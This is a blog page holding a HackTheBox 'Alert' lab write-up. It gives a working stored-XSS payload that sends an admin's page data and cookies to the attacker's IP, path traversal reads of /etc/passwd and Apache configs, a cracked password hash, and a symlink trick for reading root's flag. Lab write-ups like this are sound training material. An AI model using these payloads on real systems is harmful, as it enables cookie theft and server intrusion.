<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>Alert :: Dante&#39;s blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Initial Recon We found there are two forbidden directories and some other accessible files
→ /uploads → /messages → messages.php → contact So we got a home web page where we can upload .md file
Using burp we figure out how it executing script we used
&lt;/body&gt; &lt;script&gt;alert(&#39;xss&#39;) &lt;/script&gt; and confirmed it is vulnerable
&lt;/body&gt; ⇒ we used this so the &lt;script&gt; could execute out side of the &lt;body&gt;	→ and we figured out the file we uploading is saved on the database and we can share it using a link that is provided to view it.
" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="http://localhost:1313/htb-writeups/alert/" />





  
  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">


<link rel="stylesheet" href="http://localhost:1313/terminal.css">




<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Alert">
<meta property="og:description" content="Initial Recon We found there are two forbidden directories and some other accessible files
→ /uploads → /messages → messages.php → contact So we got a home web page where we can upload .md file
Using burp we figure out how it executing script we used
&lt;/body&gt; &lt;script&gt;alert(&#39;xss&#39;) &lt;/script&gt; and confirmed it is vulnerable
&lt;/body&gt; ⇒ we used this so the &lt;script&gt; could execute out side of the &lt;body&gt;	→ and we figured out the file we uploading is saved on the database and we can share it using a link that is provided to view it.
" />
<meta property="og:url" content="http://localhost:1313/htb-writeups/alert/" />
<meta property="og:site_name" content="Dante&#39;s blog" />

  <meta property="og:image" content="http://localhost:1313/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2025-01-26 00:00:00 &#43;0000 UTC" />












</head>
<body>


<div class="container center">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Home
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="https://app.hackthebox.com/users/627461">HackTheBox-profile</a></li>
        
      
        
          <li><a href="/htb-writeups">HTB-writeups</a></li>
        
      
        
          <li><a href="https://github.com/Alx-J">Projects</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about" >About</a></li>
        
      
        
          <li><a href="https://app.hackthebox.com/users/627461" >HackTheBox-profile</a></li>
        
      
        
          <li><a href="/htb-writeups" >HTB-writeups</a></li>
        
      
        
          <li><a href="https://github.com/Alx-J" >Projects</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="http://localhost:1313/htb-writeups/alert/">Alert</a>
  </h1>
  <div class="post-meta"><time class="post-date">2025-01-26</time></div>

  
    <span class="post-tags">
      
      #<a href="http://localhost:1313/tags/htb/">htb</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/easy/">easy</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/linux/">linux</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <h1 id="initial-recon">Initial Recon<a href="#initial-recon" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>We found there are two forbidden directories and some other accessible files</p>
<pre tabindex="0"><code>→ /uploads
→ /messages 
→ messages.php
→ contact
</code></pre><p>So we got a home web page where we can upload .md file</p>
<p>Using burp we figure out how it executing script
we used</p>
<pre tabindex="0"><code> &lt;/body&gt; &lt;script&gt;alert(&#39;xss&#39;) &lt;/script&gt;
</code></pre><p>and confirmed it is vulnerable</p>
<pre tabindex="0"><code>&lt;/body&gt; ⇒ we used this so the &lt;script&gt; could execute out side of the &lt;body&gt;	
</code></pre><p>→ and we figured out the file we uploading is saved on the database and we can share it using a link that is provided to view it.</p>
<p>![[alert1.png]]</p>
<p>→ then we went to the contact page where we can able to send a message to admin</p>
<hr>
<p><code>Note:</code>
For xss attack someone need to click on the link so we check that the admin will click the link</p>
<hr>
<p>→ we set a http server on our machine and set a message to a admin</p>
<pre tabindex="0"><code>http://&lt;our-ip&gt;:&lt;port&gt;/&lt;somefile&gt;
</code></pre><p>To check the admin is clicking the link and he did, the file is downloaded from our machine</p>
<hr>
<p><strong>Key Points :</strong></p>
<ol>
<li>The webpage which is vulnerable for XSS and it stores the file as link</li>
<li>The admin is clicking the link which we sending from contact page</li>
</ol>
<hr>
<h1 id="user">User<a href="#user" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>so we gonna make the script executed by the admin, and data in index.php?page=messages gonna be retrieved along with admin cookie</p>
<p><strong><code>Payload play a crucial role here</code></strong></p>
<p>→ we gonna upload a payload then we gonna use the link which is generated and send it to the admin and he clicks and system command will be executed by admin</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>   <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/body&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">readfile</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://alert.htb/index.php?page=messages&#34;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">readfile</span>)
</span></span><span style="display:flex;"><span>		.<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>())
</span></span><span style="display:flex;"><span>		.<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {     
</span></span><span style="display:flex;"><span>		    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.10.14.39:9001/?data=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">data</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;cookie=&#34;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>);
</span></span><span style="display:flex;"><span>		})
</span></span><span style="display:flex;"><span>		.<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.10.14.39:9001/?err=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">message</span>));
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><p>⇒ output on our python sever on port 9001</p>
<pre tabindex="0"><code>GET / data=%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20href%3D%22css%2Fstyle.css%22%3E%0A%20%20%20%20%3Ctitle%3EAlert%20-%20Markdown%20Viewer%3C%2Ftitle%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%20%20%20%20%3Cnav%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dalert%22%3EMarkdown%20Viewer%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dcontact%22%3EContact%20Us%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dabout%22%3EAbout%20Us%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Ddonate%22%3EDonate%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22index.php%3Fpage%3Dmessages%22%3EMessages%3C%2Fa%3E%20%20%20%20%3C%2Fnav%3E%0A%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%3Ch1%3EMessages%3C%2Fh1%3E%3Cul%3E%3Cli%3E%3Ca%20href%3D%27messages.php%3Ffile%3D2024-03-10_15-48-34.txt%27%3E2024-03-10_15-48-34.txt%3C%2Fa%3E%3C%2Fli%3E%3C%2Ful%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3Cfooter%3E%0A%20%20%20%20%20%20%20%20%3Cp%20style%3D%22color%3A%20black%3B%22%3E%C2%A9%202024%20Alert.%20All%20rights%20reserved.%3C%2Fp%3E%0A%20%20%20%20%3C%2Ffooter%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%0A&amp;cookie= HTTP/1.1&#34; 200 -
</code></pre><p>→ if we <strong>decode</strong> it,</p>
<pre tabindex="0"><code>:
&lt;div class=&#34;container&#34;&gt;
        &lt;h1&gt;Messages&lt;/h1&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;messages.php?file=2024-03-10_15-48-34.txt&#39;&gt;2024-03-10_15-48-34.txt&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
    &lt;/div&gt;
:
</code></pre><p>→ we can use that parameter &ldquo;<code>messages.php?file=2024-03-10_15-48-34.txt</code>&rdquo; to execute system commands because it can access system files, and we gonna use it to retrieve information</p>
<p><code>Modified payload</code> to execute system commands because that parameter reads files from system</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/body&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">readfile</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://alert.htb/messages.php?file=../../../../etc/passwd&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">readfile</span>)
</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>())
</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {     
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.10.14.39:9001/?data=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">data</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;cookie=&#34;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>);
</span></span><span style="display:flex;"><span>    })
</span></span><span style="display:flex;"><span>    .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.10.14.39:9001/?err=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">message</span>));
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><p>the process of getting the link and we send that link to admin process is repetitive</p>
<p>→ as decoded we found users</p>
<pre tabindex="0"><code class="language-output" data-lang="output">- admin
- albert
- david 
</code></pre><p>→ here after same payload just change the path and repeat the process like <code>../../../../etc/hosts</code>
⇒ we see that it has another domain name called statistics.alert.htb</p>
<p>Then change it to <code>../../../../etc/apache2/sites-available/000-default.conf</code>
⇒ to check for <code>apache configuration</code>
⇒<code>authenticated user credentials</code> stored directory path mentioned there</p>
<p>![[alert2.png]]
⇒ <code>/var/www/statistics.alert.htb/.htpasswd</code></p>
<p>⇒ we got creds <code>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</code> → <code>manchesterunited</code></p>
<p>We logged in as <code>albert</code> by SSH</p>
<h1 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<pre tabindex="0"><code>ps aux    
</code></pre><p>→ we seen that there is a folder runs a /usr/bin/php -<code>/opt/website-monitor</code></p>
<p>→ which hosts on <code>127.0.0.1:8080</code></p>
<p>→ when we check on it we see a monitor folder which is <code>read, write, executable by all users</code></p>
<p>#symbolic_link</p>
<pre tabindex="0"><code>touch rootflag.txt ⇒ we create a dumb txt file 
</code></pre><pre tabindex="0"><code>ln -sf /root/root.txt rootflag.txt 
</code></pre><p>⇒ we knew where the real root.txt so we made a <code>symbolic link</code> which is forced to open the root.txt when we open <code>rootflag.txt</code></p>
<p>→ now <code>rootflag.txt</code> has the contents of root.txt due to we can&rsquo;t access it in the terminal we used curl on the local host:port it hosting we got the content</p>
<pre tabindex="0"><code>eg:
albert@alert:/opt/website-monitor/monitors$ cat rootflag.txt
cat: rootflag.txt: Permission denied
albert@alert:/opt/website-monitor/monitors$ curl http://127.0.0.1:8080/monitors/rootflag.txt
</code></pre><pre tabindex="0"><code>Root flag - e9e1d744be37421134e24aa84b1fa4a7
</code></pre><p>Gained <code>root</code></p>

      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
